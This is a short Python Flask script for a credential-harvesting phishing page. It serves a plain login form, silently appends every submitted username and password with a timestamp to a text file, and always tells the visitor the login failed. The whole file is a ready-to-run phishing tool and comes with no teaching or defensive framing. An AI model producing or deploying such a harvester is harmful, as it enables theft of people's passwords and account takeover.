from flask import Flask, request, render_template_string
import datetime

app = Flask(__name__)

LOGFILE = "creds.txt"

# html login form (simple template)
LOGIN_FORM = """
<!DOCTYPE html>
<html>
<head><title>Login</title></head>
<body>
    <h2>Login Page</h2>
    <form action="/login" method="post">
        Username: <input type="text" name="username"><br>
        Password: <input type="password" name="password"><br>
        <input type="submit" value="Login">
    </form>
</body>
</html>
"""

@app.route("/")
def index():
    return render_template_string(LOGIN_FORM)

@app.route("/login", methods=["POST"])
def login():
    user = request.form.get("username", "")
    pwd = request.form.get("password", "")
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(LOGFILE, "a") as f:
        f.write(f"{timestamp}: {user}:{pwd}\n")
    return "<h3>Login failed. Try again.</h3>"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)
